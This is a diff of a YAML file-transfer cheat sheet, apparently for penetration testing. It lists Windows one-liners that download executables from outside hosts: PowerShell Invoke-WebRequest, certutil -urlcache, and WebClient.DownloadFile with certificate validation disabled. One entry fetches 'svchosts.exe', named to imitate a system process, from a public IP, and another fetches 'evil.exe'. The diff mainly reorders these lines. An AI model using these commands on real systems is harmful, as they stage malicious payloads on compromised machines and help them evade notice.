@@ -3,18 +3,13 @@ functions:
   file-transfer:
     - description: Download Files
       code: |
-        powershell -c iwr -Uri http://192.168.1.1:8080/sysupdate.exe -usebasicparsing
-        
-        Invoke-Webrequest -Uri http://192.168.1.1:8080/sysupdate.exe -usebasicparsing
-        
-        certutil.exe -urlcache -f http://192.168.1.1:8080/get.exe get.exe
+        POWERSHELL
 
         powershell -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).DownloadFile('https://68.183.217.18:56789/svchosts.exe','svchosts.exe')"
 
-        POWERSHELL
-
-
         powershell -c iwr -Uri http://192.168.119.149:8000/task.xml -OutFile task.xml -usebasicparsing
+
+        Invoke-Webrequest -Uri http://192.168.1.1:8080/sysupdate.exe -usebasicparsing
 
         powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')"
 
